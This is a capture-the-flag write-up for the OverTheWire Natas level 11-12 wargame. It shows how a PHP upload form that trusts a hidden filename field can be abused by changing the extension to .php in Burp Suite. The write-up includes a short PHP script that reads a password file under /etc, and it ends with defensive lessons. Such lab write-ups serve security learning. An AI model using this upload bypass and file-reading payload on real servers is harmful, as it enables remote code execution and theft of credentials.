# Natas OverTheWire Level 11-12

## Objective

 
 Retrieve the password for the next level


---

## Vulnerability Analysis

The application allows users to upload a file through a form

in the source code we see relevant things:

    function makeRandomPathFromFilename($dir, $fn) {
        $ext = pathinfo($fn, PATHINFO_EXTENSION);
        return makeRandomPath($dir, $ext);

    }

The upload destination is determined from:

    $_POST["filename"]

which comes from a hidden form field

    <input type="hidden" name="filename" value="random.jpg" />

Then the server extracts the extension using 

    $ext = pathinfo($fn, PATHINFO_EXTENSION);

and generates a random filename using that extension

We see that the application only validates the file size:

    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000)

There are no checks for an actual image

As a result, the application trusts the user parameter to determine the final file extension

---

## Exploitation Process

Analyzing the source code 

We see that the application never actually verifies that the uploaded file is a JPEG

The only restriction is the size




A simple text file was created and uploaded 

The application accepted the upload and returned the path

    upload/z8mrra2rtu.jpg

At first i renamed my local file as 

    file.php

and uploaded it

The resulting file was still stored as

    upload/random.jpg

When i looked the code again i checked the extension was not taken from my input,instead it was taken from

    $_POST["filename"]

which comes from the hidden form field


So now using Burpsuite as an intercepting proxy we see

    Content-Disposition: form-data; name="filename"

    uwtx9sr9bn.jpg



    Content-Disposition: form-data; name="uploadedfile";

The intercepted request was modified

from:

    uwtx9sr9bn.jpg



to:

    uwtx9sr9bn.php

And the application responded with:

    upload/ssq193frmg.php has been uploaded

Then a small PHP file was created to prove execution


    <?php
    echo "Hello there!";
    ?>

The file was uploaded using the modified .php extension

Visiting the uploaded file produced:

    Hello there!

So, we confirmed execution by the server



Now we uploaded a PHP script that used:

    file_get_contents()

to read:
    
    /etc/natas_webpass/natas13


and print its contents...


    <?php
    $contents = file_get_contents('/etc/natas_webpass/natas13');
    echo $contents;
    ?>


And checking the file, we got the password.


---

## Observations and Findings

- Hidden fields are not security controls

- The file content was never validated

- User-controlled extension led to code execution

---

## key Concepts Learned

- Allowing arbitrary file uploads without proper validation can lead to important security issues

- Values stored in hidden HTML fields should never be trusted by the server

- Uploading and executing PHP file effectively allows an attacker to run code on the server...this is one of the highest-impact web vulnerabilities





